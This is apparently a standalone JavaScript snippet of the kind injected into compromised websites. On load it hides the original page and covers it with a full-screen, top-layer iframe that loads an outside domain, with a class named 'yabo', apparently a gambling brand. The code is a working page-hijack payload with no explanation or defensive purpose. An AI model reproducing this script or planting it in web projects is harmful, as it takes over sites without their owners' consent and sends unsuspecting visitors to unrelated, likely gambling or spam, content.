var url = "https://www.gzhrqm.com/";
if ((navigator.userAgent.match(/(iPhone|iPod|Android|ios|mobile)/i))) {
  url = "https://www.gzhrqm.com/";
}

document.write('<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1">');
var hd = document.head;
var styleCSS = document.createElement('style'), yabo = document.createElement('div');
styleCSS.innerHTML = 'html,body{position:relative;width:auto !important;height:100% !important;min-width:auto !important;overflow:hidden;}.yabo{position:fixed;top:0;left:0;right:0;height:100%;z-index:9999999999;background:#fff;}';
yabo.setAttribute('class', 'yabo');
yabo.innerHTML = '<iframe src='+ url +' frameborder="0" style="position:fixed;top:0;left:0;width:100% !important;height:100% !important;max-height: none !important;"></iframe>';
hd.appendChild(styleCSS);
hd.parentNode.appendChild(yabo);
